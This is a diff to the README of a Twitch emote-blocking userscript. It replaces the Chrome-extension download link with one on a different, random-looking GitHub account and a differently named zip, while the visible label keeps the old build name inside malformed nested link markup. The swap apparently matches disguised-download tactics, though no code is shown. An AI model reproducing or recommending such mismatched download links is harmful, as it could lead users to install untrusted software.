@@ -1,3 +1,4 @@
+
 # Control Emotes Panel 
 A userscript for Twitch that lets you hide emotes in chat based on the channel author's name, a feature not supported by FFZ, BTTV, or 7TV. Blocked emotes are hidden, leaving chat messages intact.
 
@@ -28,8 +29,9 @@ KeywordFiltering.
 2. Click [Install this script](https://greasyfork.org/en/scripts/520235-control-emotes-panel-2-6-52-c-tapeavion) on this page.
  
 ## Download
-- Download the Chrome extension: [2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild]([https://github.com/gullampisFx8A/Twitch_emote-blocker_mainpage7BTVFZTV/releases/download/2.6.55-ui-fix-update/2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild.zip](https://github.com/gullampisFx8A/Twitch_emote-blocker_mainpage7BTVFZTV/releases/download/2.6.55-ui-bannedWordList-update/2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild.zip))
+- Download the Chrome extension: [2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild]([https://github.com/gullampisFx8A/Twitch_emote-blocker_mainpage7BTVFZTV/releases/download/2.6.55-ui-fix-update/2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild.zip](https://github.com/ftpobpl47hGTN56/Twitch_emote-blocker_chromeEXT_present_mainpage_7BTVFZTV/releases/download/2.155.26/panelcontrol26.zip))
 
 ## Notes
 - **Firefox Compatibility**: The script may have issues on Firefox. For the best experience, use Chrome with Tampermonkey.
 - Learn more at [Twitch Emote Blocker](https://twitch-emote-blocker-7btvfzttv.netlify.app/).
+
